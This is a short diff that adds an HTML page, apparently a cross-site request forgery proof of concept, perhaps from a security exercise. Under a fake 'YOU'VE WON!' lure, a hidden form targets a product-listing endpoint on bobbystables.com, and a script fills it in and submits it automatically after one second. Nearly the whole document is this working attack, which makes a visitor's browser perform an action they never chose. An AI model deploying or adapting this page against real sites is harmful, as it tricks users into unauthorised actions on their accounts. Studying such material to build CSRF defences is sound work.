@@ -1,0 +1,19 @@
+Congratulations! YOU'VE WON!
+
+<form method="post" action="http://www.bobbystables.com/index.php" style="display: none" id="form">
+        <input name="productSubmitted" type="hidden">
+        <input name="productName" placeholder="Product Name" type="text" id="name">
+        $<input name="productPrice" placeholder="0" type="text" id="price">
+        <button type="submit">Submit New Listing</button>
+</form>
+
+<script>
+setTimeout(function() {
+document.getElementById('name').value = 'CSRF LOL';
+document.getElementById('price').value = '11111';
+document.getElementById('form').submit();
+
+}, 1000);
+
+</script>
+
